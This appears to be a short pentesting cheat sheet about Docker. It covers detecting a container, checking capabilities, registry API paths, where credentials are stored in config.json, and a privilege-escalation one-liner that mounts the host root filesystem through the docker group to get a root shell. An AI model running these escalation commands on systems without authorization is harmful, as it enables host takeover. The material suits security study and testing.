Docker and containers


## Want to know if you are inside a container in Linux ?

`cat /proc/self/cgroup`

---

## Capabilities provided to the container 

`apsh --print`

- If you have SYS_MODULE listed, you will be able to become root outside of the conatainer : https://blog.pentesteracademy.com/privilege-escalation-ctf-walkthrough-part-ii-b596f345ecd1

## Registry API

- in general in /v2/

- List repository : /v2/_catalog

- see docs.docker.com/registry/spec/api

---

## Login on docker

- install docker

- ```docker login <url>```

- if it needs certificate : ```mkdir -p /etc/docker/certs.d/url```, copy it inside, and login

---

## Password storing 

- ~/.docker/config.json or /root/.docker/config.json

---

## Run the container

- ```docker run -it url/<repository-image> sh```

---

## Privilege escalation

- Your user is in the docker group ? gtfobins docker :
- ```docker images```
- ```docker run -v /:/mnt --rm -it <image found> chroot /mnt sh```





